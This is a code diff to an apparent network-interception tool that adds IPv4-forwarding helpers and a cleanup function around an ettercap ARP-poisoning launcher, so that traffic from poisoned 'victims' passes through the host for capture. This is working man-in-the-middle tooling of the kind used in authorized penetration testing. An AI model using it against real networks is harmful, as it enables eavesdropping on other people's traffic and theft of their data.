@@ -41,8 +41,11 @@ __all__ = [
     "require_authorization",
     "discover_gateway",
     "discover_clients",
+    "ip_forward_enabled",
+    "set_ip_forward",
     "start_ettercap",
     "stop_daemon",
+    "stop_poison",
     "capture_note",
     "strip_wire_headers",
     "capture_payloads",
@@ -206,6 +209,30 @@ def neighbor_table(neigh: str = None) -> dict:
 # daemons
 # --------------------------------------------------------------------------
 
+_IP_FORWARD_PATH = "/proc/sys/net/ipv4/ip_forward"
+
+
+def ip_forward_enabled() -> bool:
+    """Whether the kernel is currently forwarding IPv4 packets."""
+    try:
+        with open(_IP_FORWARD_PATH, encoding="ascii") as fh:
+            return fh.read().strip() == "1"
+    except OSError:
+        return False
+
+
+def set_ip_forward(enabled: bool) -> bool:
+    """Best-effort write to net.ipv4.ip_forward. Returns True on success, False
+    if it could not be written (e.g. not root, or no /proc). Never raises:
+    a failed write is reported by the caller, not fatal here."""
+    try:
+        with open(_IP_FORWARD_PATH, "w", encoding="ascii") as fh:
+            fh.write("1" if enabled else "0")
+        return True
+    except OSError:
+        return False
+
+
 def start_ettercap(iface: str, gateway: str, targets: str = None,
                    dry_run: bool = False, runner: str = "sudo",
                    log_path: str = "/tmp/matt-ettercap.log") -> dict:
@@ -213,12 +240,20 @@ def start_ettercap(iface: str, gateway: str, targets: str = None,
 
     Never raises for a missing binary: the reason goes in the report, the run
     continues, and the operator still gets a file to read.
+
+    ARP poisoning only moves traffic through this host if the kernel is
+    actually forwarding IPv4 -- without net.ipv4.ip_forward=1, every poisoned
+    victim just loses connectivity (dropped at this host) while nothing useful
+    reaches the capture either. So this enables it before ettercap starts
+    (remembering the prior value, so it can be restored when poisoning stops)
+    and records what it did in the status dict for the report/CLI to show.
     """
     cmd = [runner, "ettercap", "-T", "-q", "-i", iface, "-w", log_path]
     if gateway:
         cmd += ["-M", "arp:remote", gateway, targets or ""]
     cmd = [part for part in cmd if part != ""]
-    status = {"cmd": cmd, "started": False, "pid": None, "reason": ""}
+    status = {"cmd": cmd, "started": False, "pid": None, "reason": "",
+              "ip_forward_was_on": ip_forward_enabled(), "ip_forward_enabled": False}
     if dry_run:
         status["reason"] = "dry run: not launched"
         return status
@@ -227,6 +262,14 @@ def start_ettercap(iface: str, gateway: str, targets: str = None,
                             "Install ettercap, or pass --no-poison to say so on "
                             "purpose.")
         return status
+    if not status["ip_forward_was_on"]:
+        status["ip_forward_enabled"] = set_ip_forward(True)
+        if not status["ip_forward_enabled"]:
+            status["reason"] = ("could not enable net.ipv4.ip_forward: without it, "
+                                "poisoned victims lose connectivity instead of "
+                                "having their traffic pass through here. Run as "
+                                "root, or `sudo sysctl -w net.ipv4.ip_forward=1`.")
+            return status
     try:
         with open(log_path, "ab") as log:
             proc = subprocess.Popen(cmd, stdout=log, stderr=log,
@@ -236,6 +279,16 @@ def start_ettercap(iface: str, gateway: str, targets: str = None,
     except OSError as exc:
         status["reason"] = f"could not start ettercap: {exc}"
     return status
+
+
+def stop_poison(status: dict) -> None:
+    """Undo what start_ettercap() did: kill the daemon (if running) and put
+    ip_forward back to whatever it was before, but only if MATT was the one
+    that turned it on -- never flips it off if the operator already had it on
+    for some other reason."""
+    stop_daemon(status.get("pid"))
+    if status.get("ip_forward_enabled"):
+        set_ip_forward(status.get("ip_forward_was_on", False))
 
 
 def stop_daemon(pid: int) -> None:
